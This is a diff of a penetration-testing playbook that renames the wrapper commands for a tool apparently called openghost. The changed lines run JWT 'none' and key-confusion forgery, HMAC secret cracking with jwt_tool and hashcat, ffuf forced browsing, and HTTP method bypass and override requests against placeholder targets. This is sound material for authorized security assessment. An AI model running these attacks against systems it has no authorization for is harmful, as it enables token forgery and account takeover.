@@ -35,10 +35,10 @@ Record:
 
 ```bash
 # Decode JWT header and payload
-scripts/openghost.sh exec-bash 'TOKEN="<JWT>"; echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq .; echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .'
+openghost bash 'TOKEN="<JWT>"; echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq .; echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .'
 
 # jwt_tool inspection
-scripts/openghost.sh exec-tool jwt_tool <JWT>
+openghost run jwt_tool <JWT>
 ```
 
 Check header fields:
@@ -63,7 +63,7 @@ header.payload.
 ```
 
 ```bash
-scripts/openghost.sh exec-tool jwt_tool <JWT> -X a
+openghost run jwt_tool <JWT> -X a
 ```
 
 Try case variations if the implementation is old: `none`, `None`, `NONE`, `nOnE`.
@@ -74,11 +74,11 @@ If a token uses an asymmetric algorithm, attempt to sign an HS256 token with the
 
 ```bash
 # Obtain public key from JWKS or certificate
-scripts/openghost.sh exec-bash 'curl -s https://<target>/.well-known/jwks.json | jq .'
-scripts/openghost.sh exec-bash 'openssl s_client -connect <target>:443 </dev/null 2>/dev/null | openssl x509 -pubkey -noout > public_key.pem'
+openghost bash 'curl -s https://<target>/.well-known/jwks.json | jq .'
+openghost bash 'openssl s_client -connect <target>:443 </dev/null 2>/dev/null | openssl x509 -pubkey -noout > public_key.pem'
 
 # jwt_tool confusion attack
-scripts/openghost.sh exec-tool jwt_tool <JWT> -X k -pk public_key.pem
+openghost run jwt_tool <JWT> -X k -pk public_key.pem
 ```
 
 Confirmed only if the forged token is accepted by a protected endpoint.
@@ -86,8 +86,8 @@ Confirmed only if the forged token is accepted by a protected endpoint.
 ### Weak HMAC Secret
 
 ```bash
-scripts/openghost.sh exec-tool jwt_tool <JWT> -C -d /usr/share/wordlists/rockyou.txt
-scripts/openghost.sh exec-bash 'printf "%s\n" "<JWT>" > /tmp/jwt.txt && hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt --quiet'
+openghost run jwt_tool <JWT> -C -d /usr/share/wordlists/rockyou.txt
+openghost bash 'printf "%s\n" "<JWT>" > /tmp/jwt.txt && hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt --quiet'
 ```
 
 If cracked, validate by changing a harmless claim first, then a privilege claim with a test account.
@@ -127,7 +127,7 @@ Try modifying claims without changing signature first. If the app accepts unsign
 ### Discovery
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s https://<auth-host>/.well-known/openid-configuration | jq .'
+openghost bash 'curl -s https://<auth-host>/.well-known/openid-configuration | jq .'
 ```
 
 Record:
@@ -208,7 +208,7 @@ Evidence should include redacted SAML response, modified field, accepted session
 ### Cookie Security
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -I https://<target>/login | grep -i set-cookie'
+openghost bash 'curl -s -I https://<target>/login | grep -i set-cookie'
 ```
 
 Check:
@@ -265,21 +265,21 @@ CSRF is stronger when SameSite cookies allow the request and the action has mate
 ### Forced Browsing
 
 ```bash
-scripts/openghost.sh exec-tool ffuf -u https://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,401,403
-scripts/openghost.sh exec-bash 'curl -s -o /dev/null -w "%{http_code}\n" https://<target>/admin'
-scripts/openghost.sh exec-bash 'curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer invalid" https://<target>/admin'
+openghost run ffuf -u https://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,401,403
+openghost bash 'curl -s -o /dev/null -w "%{http_code}\n" https://<target>/admin'
+openghost bash 'curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer invalid" https://<target>/admin'
 ```
 
 ### Method Bypass
 
 ```bash
-scripts/openghost.sh exec-bash 'for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do echo -n "$m "; curl -s -o /dev/null -w "%{http_code}\n" -X $m https://<target>/admin; done'
+openghost bash 'for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do echo -n "$m "; curl -s -o /dev/null -w "%{http_code}\n" -X $m https://<target>/admin; done'
 ```
 
 ### Method Override
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -X POST -H "X-HTTP-Method-Override: DELETE" https://<target>/api/users/123'
+openghost bash 'curl -s -X POST -H "X-HTTP-Method-Override: DELETE" https://<target>/api/users/123'
 ```
 
 ### Path Normalization
